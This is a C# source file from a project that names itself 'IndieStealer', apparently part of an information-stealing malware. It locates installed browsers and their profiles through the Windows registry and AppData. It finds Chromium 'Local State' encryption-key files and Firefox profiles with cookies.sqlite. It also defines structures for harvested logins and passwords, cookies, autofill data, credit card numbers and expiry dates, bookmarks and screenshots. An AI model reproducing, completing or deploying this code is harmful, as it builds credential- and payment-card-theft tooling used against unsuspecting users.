using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.WebSockets;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using IndieStealer.Collect.System;

namespace IndieStealer.Collect.Browsers
{
    
    class BrowserDataStorage
    {
        public static Dictionary<Profile, BrowserData> BrowserData = new Dictionary<Profile, BrowserData>();
        public static List<BrowserModel> Browsers = ListBrowsers();
		private static List<BrowserModel> ListBrowsers()
        {
            List<BrowserModel> browsers = new List<BrowserModel>();
			try
			{
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\WOW6432Node\\Clients\\StartMenuInternet") ?? Registry.LocalMachine.OpenSubKey("Software\\Clients\\StartMenuInternet");
                RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Clients\\StartMenuInternet");
                string[] directories = Directory.GetDirectories(Info.AppdataLocal);
                string[] directories2 = Directory.GetDirectories(Info.Appdata);
                if (registryKey != null)
                {
                    string[] subKeyNames = registryKey.GetSubKeyNames();
                    foreach (var subKey in subKeyNames)
                    {
                        try 
                        {
                            BrowserModel browserModel = new BrowserModel();
                            RegistryKey registryKey3 = registryKey.OpenSubKey(subKey);
                            browserModel.Name = (string)registryKey3.GetValue(null);
                            browserModel.InstallPath = ((string)registryKey3.OpenSubKey("shell\\open\\command")?.GetValue(null)).Replace("\"","");
                            string[] values = browserModel.Name.Split(new char[] { ' ' },StringSplitOptions.RemoveEmptyEntries);
                            string trimmedName = values.Length > 1 ? values[1] : null;
                            if (browserModel.Name == "Microsoft Edge")
                            {
                                foreach (var directory in Directory.GetDirectories(Info.AppdataLocal + "\\Microsoft\\Edge\\"))
                                {
                                    if (File.Exists(directory + "\\Local State"))
                                    {
                                        if (browserModel.Profiles == null)
                                            browserModel.Profiles = new List<Profile>();
                                        browserModel.LocalKeyPath = directory + "\\Local State";
                                        var centralBrowserDir = directory;
                                        if (Directory.Exists(centralBrowserDir + "\\Default"))
                                            browserModel.Profiles.Add(new Profile("Default", centralBrowserDir + "\\Default", browserModel.Name));

                                        var browserSubDirs = Directory.GetDirectories(centralBrowserDir);
                                        foreach (var subDir in browserSubDirs)
                                        {
                                            var splitted = subDir.Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                                            var lastFolderName = splitted[splitted.Length - 1];
                                            if (lastFolderName.Contains("Profile"))
                                            {
                                                browserModel.Profiles.Add(new Profile(lastFolderName, centralBrowserDir + "\\" + lastFolderName, browserModel.Name));
                                            }
                                            
                                        }

                                                                            }
                                }
                                browsers.Add(browserModel);
                                continue;
                               
                            }
                            browserModel = SearchBrowsers(directories, directories2, browserModel, trimmedName);
                            browsers.Add(browserModel);
                        }
                        catch (Exception exception)
                        { }
                       
                    }
                }
                if (registryKey2 != null)
                {
                    string[] subKeyNames = registryKey2.GetSubKeyNames();
                    foreach (var subKey in subKeyNames)
                    {
                        BrowserModel browserModel = new BrowserModel();
                        RegistryKey registryKey3 = registryKey2.OpenSubKey(subKey);
                        browserModel.Name = (string)registryKey3.GetValue(null);
                        foreach (var browser in browsers)
                        {
                            if (browser.Name == browserModel.Name)
                            {
                                return browsers;
                            }
                        }
                        browserModel.InstallPath = ((string)registryKey3.OpenSubKey("shell\\open\\command")?.GetValue(null)).Replace("\"","");
                        string[] values = browserModel.Name.Split(new char[] { ' ' },StringSplitOptions.RemoveEmptyEntries);
                        string trimmedName = values.Length > 1 ? values[1] : null;
                        browserModel = SearchBrowsers(directories, directories2, browserModel, trimmedName);
                        browsers.Add(browserModel);
                    }

                }
            }
			catch (Exception ex)
			{}
			return browsers;


		}
        
        private static BrowserModel SearchBrowsers(string[] localAppData, string[] appData,BrowserModel browserModel, string trimmedName)
        {
            foreach (var directory in localAppData)
            {
                try
                {
                    string[] files = Directory.GetFiles(directory, "Local State",
                        SearchOption.AllDirectories);
                    foreach (var file in files)
                    {
                       
                        if (!string.IsNullOrEmpty(trimmedName) && (file.Contains(trimmedName) || file.Contains(browserModel.Name) || file.Contains(browserModel.Name.Trim())))
                        {   
                            if (browserModel.Profiles == null)
                                browserModel.Profiles = new List<Profile>();
                            browserModel.LocalKeyPath = file;
                            var centralBrowserDir = file.Replace("\\Local State", "");
                            if (Directory.Exists(centralBrowserDir + "\\Default"))
                                browserModel.Profiles.Add(new Profile("Default",centralBrowserDir + "\\Default", browserModel.Name));
                            var browserSubDirs = Directory.GetDirectories(centralBrowserDir);
                            foreach (var subDir in browserSubDirs)
                            {
                                var splitted = subDir.Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                                var lastFolderName = splitted[splitted.Length - 1];
                                if (lastFolderName.Contains("Profile"))
                                {
                                    browserModel.Profiles.Add(new Profile(lastFolderName, centralBrowserDir + "\\" + lastFolderName, browserModel.Name));
                                }
                                    
                            }
                                                                                   
                                                                                    }
                    }
                    if (browserModel.Profiles != null)
                        break;
                }
                catch (UnauthorizedAccessException ex){ continue;}
                catch (Exception ex)
                {}
            }

            if (browserModel.Profiles == null)
            {
                foreach (var directory in appData)
                {
                    try
                    {
                                                string[] files = Directory.GetFiles(directory, "profiles.ini",
                            SearchOption.AllDirectories);
                        foreach (var file in files)
                        {
                            if (!string.IsNullOrEmpty(trimmedName) && (file.Contains(trimmedName) || file.Contains(browserModel.Name) || file.Contains(browserModel.Name.Trim())))
                            {
                                using (FileStream fileStream = new FileStream(file, FileMode.Open))
                                {
                                    using (StreamReader streamReader = new StreamReader(fileStream))
                                    {
                                        string text = streamReader.ReadToEnd();
                                        Regex regex = new Regex(@"Path=(\S*)",RegexOptions.Multiline);
                                        MatchCollection matches = regex.Matches(text);
                                        if (matches.Count > 0)
                                        {
                                            if (browserModel.Profiles == null)
                                                browserModel.Profiles = new List<Profile>();
                                            foreach (Match match in matches)
                                            {
                                                string value = match.Value.Replace("Path=","");
                                                string preprofileName = value.Replace("/", "\\");
                                                string profileName = preprofileName.Split(new char[] { '\\' },StringSplitOptions.RemoveEmptyEntries)[1];
                                                string profileFolder = file.Replace("\\profiles.ini", "\\") + preprofileName;
                                                if (File.Exists(profileFolder + "\\cookies.sqlite"))
                                                {
                                                    browserModel.LocalKeyPath = null;
                                                    browserModel.Profiles.Add(new Profile(profileName, profileFolder, browserModel.Name));
                                                }
                                            }
                                        

                                        }

                                    }
                                }
                            }
                        }
                        if (browserModel.Profiles != null)
                            break;
			       
                    }
                    catch (UnauthorizedAccessException ex){ continue;}
                    catch (Exception ex)
                    {}

                    try
                    {
                        if (browserModel.Profiles == null)
                        {
                            string[] files = Directory.GetFiles(directory, "Local State", SearchOption.AllDirectories);
                            foreach (var file in files)
                            {
                                if (!string.IsNullOrEmpty(trimmedName) && (file.Contains(trimmedName) || file.Contains(browserModel.Name) || file.Contains(browserModel.Name.Trim())))
                                {
                                    if (browserModel.Profiles == null)
                                        browserModel.Profiles = new List<Profile>();
                                    browserModel.LocalKeyPath = file;
                                    var centralBrowserDir = file.Replace("\\Local State", "");
                                    if (Directory.Exists(centralBrowserDir + "\\Default"))
                                        browserModel.Profiles.Add(new Profile("Default", centralBrowserDir + "\\Default", browserModel.Name));
                                    var browserSubDirs = Directory.GetDirectories(centralBrowserDir);
                                    foreach (var subDir in browserSubDirs)
                                    {
                                        var splitted = subDir.Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                                        var lastFolderName = splitted[splitted.Length - 1];
                                        if (lastFolderName.Contains("Profile"))
                                        {
                                            browserModel.Profiles.Add(new Profile(lastFolderName, centralBrowserDir + "\\" + lastFolderName, browserModel.Name));
                                        }
                                        
                                    }

                                                                                                                                                                                                                                                        }
                            }
                        }
                        if (browserModel.Profiles != null)
                            break;
                    }
                    catch (UnauthorizedAccessException ex){ continue;}
                    catch (Exception ex)
                    {}
                }
            }
            return browserModel;
        }
    }
   
    class BrowserModel
    {
        public string Name { get; set; }
        public string LocalKeyPath { get; set; }
        public List<Profile> Profiles { get; set; }
        public string InstallPath { get; set; }

       
    }
    class Profile
    {
        private string _name;
        private string _path;
        private string _browserName;
                        public Profile(string name, string path)
        {
            Name = name;
            Path = path;
        }
        public Profile(string name, string path,string browserName)
        {
            Name = name;
            Path = path;
            BrowserName = browserName;
        }
        public string Name 
        {
            get => _name;          
            set => _name = value; 
        }
        public string Path 
        { 
            get => _path; 
            set => _path = value; 
        }
        public string BrowserName 
        { 
            get => _browserName; 
            set => _browserName = value; 
        }
    }
    class BrowserData
    {
        private List<BrowserDataModels.Login> logins;
        private List<BrowserDataModels.Cookie> cookies;
        private List<BrowserDataModels.Autofill> autofills;
        private List<BrowserDataModels.Card> cards;
        private List<BrowserDataModels.Bookmark> bookmarks;
        public List<BrowserDataModels.Login> Logins
        {
            get => logins;
            set => logins = value;
        }

        public List<BrowserDataModels.Cookie> Cookies
        {
            get => cookies;
            set => cookies = value;
        }

        public List<BrowserDataModels.Autofill> Autofills
        {
            get => autofills;
            set => autofills = value;
        }

        public List<BrowserDataModels.Card> Cards
        {
            get => cards;
            set => cards = value;
        }

        public List<BrowserDataModels.Bookmark> Bookmarks
        {
            get => bookmarks;
            set => bookmarks = value;
        }
        public List<BrowserDataModels.Screenshot> Screenshots { get; set; }
    }

    class BrowserDataModels
    {
        internal class Screenshot
        {
            private byte[] _bytes;
            private string _profileName;

            public string ProfileName
            {
                get => _profileName;
                set => _profileName = value;
            }

            public byte[] Bytes
            {
                get => _bytes;
                set => _bytes = value;
            }
        }
        internal class Card
        {
            private string _number;
            private string _exp;
            private string _name;
            private string _nickname;

            [NameValidation]
            public string Number
            {
                get => "Number: " + _number;
                set => _number = value;
            }
            [NameValidation]
            public string Exp
            {
                get => "Exp: " + _exp;
                set => _exp = value;
            }
            [NameValidation]
            public string Name
            {
                get => "Name: " + _name;
                set => _name = value;
            }
            [NameValidation]
            [SplitValidation]
            public string Nickname
            {
                get => "Nickname: " + _nickname;
                set => _nickname = value;
            }
        }

        internal class Autofill
        {
            private string _name;
            private string _value;

            [NameValidation]
            public string Name
            {
                get => "Name: " + _name;
                set => _name = value;
            }
            [NameValidation]
            [SplitValidation]
            public string Value
            {
                get => "Value: " + _value;
                set => _value = value;
            }
        }

        internal class Cookie
        {
            private string _domain;
            private string _is_http;
            private string _path;
            private string _is_secure;
            private string _expires;
            private string _name;
            private string _value;
            
            [NameValidation]
            public string Domain
            {
                get => _domain + "\t";
                set => _domain = value;
            }
            
            [NameValidation]
            public string IsHttp
            {
                get => _is_http + "\t";
                set => _is_http = value;
            }
            
            [NameValidation]
            public string Path
            {
                get => _path + "\t";
                set => _path = value;
            }
            
            [NameValidation]
            public string IsSecure
            {
                get => _is_secure + "\t";
                set => _is_secure = value;
            }
            
            [NameValidation]
            public string Expires
            {
                get => _expires + "\t";
                set => _expires = value;
            }
            
            [NameValidation]
            public string Name
            {
                get => _name + "\t";
                set => _name = value;
            }
            
            [NameValidation]
            [SplitValidation]
            public string Value
            {
                get => _value;
                set => _value = value;
            }

            
        }
        internal class Login
        {
            private string _url;
            private string _username;
            private string _password;
        
            [NameValidation]
            public string Url
            {
                get => "Url: " + _url;
                set => _url = value;
            }
            [NameValidation]
            public string Username
            {
                get => "Login: " + _username;
                set => _username = value;
            }
            [NameValidation]
            [SplitValidation]
            public string Password
            {
                get => "Password: " + _password;
                set => _password = value;
            }
            
        }

        internal class Bookmark
        {
            private string _title;
            private string _url;
            
            [NameValidation]
            public string Title
            {
                get => "Title: " + _title;
                set => _title = value;
            }
            [NameValidation]
            [SplitValidation]
            public string Url
            {
                get => "Url: " + _url;
                set => _url = value;
            }
        }
    }
    
}
